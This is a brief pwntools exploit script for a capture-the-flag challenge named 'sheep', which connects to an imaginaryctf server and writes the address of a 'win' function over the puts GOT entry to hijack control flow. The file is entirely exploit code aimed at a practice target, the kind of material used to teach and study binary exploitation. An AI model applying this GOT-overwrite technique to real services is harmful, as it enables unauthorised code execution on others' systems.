from pwn import *

win = 0x401152
puts_got = 0x404018
# io = process("./sheep")
io = remote("puzzler7.imaginaryctf.org", 4444)
io.sendline(str(puts_got).encode())
io.sendline(str(win).encode())
io.interactive()
